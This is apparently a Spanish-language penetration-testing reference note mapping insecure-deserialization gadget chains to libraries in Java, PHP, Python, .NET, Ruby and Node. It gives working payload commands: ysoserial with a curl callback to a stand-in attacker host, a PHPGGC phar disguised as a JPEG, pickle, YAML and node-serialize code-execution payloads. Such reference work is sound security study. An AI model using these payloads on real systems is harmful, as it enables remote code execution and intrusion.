---
tipo: meta
aliases:
  - Cadenas de gadgets
  - ysoserial y PHPGGC
tags:
  - meta/referencia
  - dominio/web
---

# Deserialización gadgets - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué cadena existe para qué biblioteca. El criterio está en [[Deserialización - cadena de gadgets]]; identificar el formato, en [[Deserialización - matriz de identificación]].
>
> **Esta matriz caduca más rápido que ninguna otra del vault.** Las cadenas dependen de versiones concretas de bibliotecas, y las bibliotecas rompen sus propias cadenas de forma rutinaria. Lo que sigue es el mapa de dónde buscar, no una lista vigente.

## 0. Enumerar dependencias — el trabajo previo

Sin saber qué bibliotecas están cargadas, elegir cadena es adivinar.

```
mensajes de error con trazas de pila   → nombres de paquete y versión
/composer.lock  /composer.json         PHP
/package-lock.json  /yarn.lock         Node
/Gemfile.lock                          Ruby
/requirements.txt  /Pipfile.lock       Python
/WEB-INF/lib/                          Java
cabeceras X-Powered-By, Server
rutas de recursos estáticos con versión en el nombre
```

Los archivos de bloqueo expuestos son la vía más rápida y aparecen más seguido de lo que debería.

## 1. Java — `ysoserial`

```sh
java -jar ysoserial.jar CommonsCollections6 'curl http://atacante/x' | base64 -w0
```

Familias por biblioteca:

| Cadena | Requiere |
|---|---|
| `CommonsCollections1-7` | Apache Commons Collections |
| `CommonsBeanutils1` | Commons BeanUtils |
| `Spring1` `Spring2` | Spring core |
| `Groovy1` | Groovy |
| `ROME` | ROME |
| `Hibernate1` | Hibernate |
| `URLDNS` | **nada — solo la JDK** |

`URLDNS` no ejecuta: solo dispara una **resolución DNS**. Por eso es la primera que se manda siempre — confirma que el blob se deserializa, sin tocar el estado del proceso ni arriesgar tirar el trabajador. Es la variante inocua que recomienda [[Deserialización - cadena de gadgets]] antes de lanzar la que ejecuta.

Cuando ninguna cadena local sirve, queda la vía de **búsqueda remota de clase**: el gadget resuelve un nombre contra un servidor controlado y carga la clase desde ahí. Requiere egress y versiones de JDK que todavía lo permitan; ver [[Conexión saliente del servidor de aplicación]] para lo que deja del lado azul.

## 2. PHP — `PHPGGC`

```sh
phpggc Laravel/RCE9 system 'id' -b
```

| Familia | Marco / biblioteca |
|---|---|
| `Laravel/RCE*` | Laravel |
| `Symfony/RCE*` | Symfony |
| `Monolog/RCE*` | Monolog — presente en casi todo |
| `Guzzle/RCE*` | Guzzle |
| `WordPress/RCE*` | WordPress con extensiones |
| `Doctrine/*` | Doctrine ORM |

`Monolog` es la que más veces paga: está en el árbol de dependencias de casi cualquier aplicación PHP moderna, aunque el desarrollador no la haya elegido.

Para [[LFI - phar deserialization]], el mismo generador con salida en formato `phar`:

```sh
phpggc -p phar -o payload.jpg Monolog/RCE6 system 'id'
```

El archivo resultante pasa la validación de imagen y dispara al abrirse con `phar://`.

## 3. Python — sin gadget

```python
class E:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(E())
```

`pickle` **ejecuta código arbitrario por diseño del formato**. No hay cadena que buscar ni biblioteca que tenga que ser vulnerable: si el blob llega al deserializador, hay ejecución.

Lo mismo para YAML con cargador inseguro:

```yaml
!!python/object/apply:os.system ['id']
```

La mitigación en ambos casos no es una lista blanca: es **no usar esos formatos** para datos no confiables.

## 4. .NET — `ysoserial.net`

```sh
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c id"
```

| Gadget | Contexto |
|---|---|
| `TypeConfuseDelegate` | `BinaryFormatter` |
| `ObjectDataProvider` | `Json.NET`, `XmlSerializer`, WPF |
| `WindowsIdentity` | `Json.NET` |

`ViewState` es el caso propio de ASP.NET: si se recupera el `machineKey`, se firma un `ViewState` con el gadget adentro. Ver [[Deserialización - firma débil]].

## 5. Ruby y Node

Ruby `Marshal` tiene cadenas universales que solo dependen de la biblioteca estándar y de la versión del intérprete — no hace falta ninguna dependencia vulnerable.

Node no tiene deserialización nativa peligrosa. Lo que aparece es `node-serialize`, cuyo formato permite incrustar una función que se invoca al deserializar:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

Los paréntesis finales son lo que la ejecuta de inmediato.

## 6. Orden de trabajo

```
enumerar dependencias        reconocimiento, lo más caro
identificar el formato       [[Deserialización - matriz de identificación]]
¿está firmado?               [[Deserialización - firma débil]]
¿alcanza con editar campos?  [[Deserialización - manipulación de objeto]]
confirmar con URLDNS o equivalente inocuo
recién ahí, la cadena que ejecuta
```

Los dos pasos del medio se saltean todo el tiempo, y son los que más veces resuelven el caso sin necesidad de ninguna cadena.
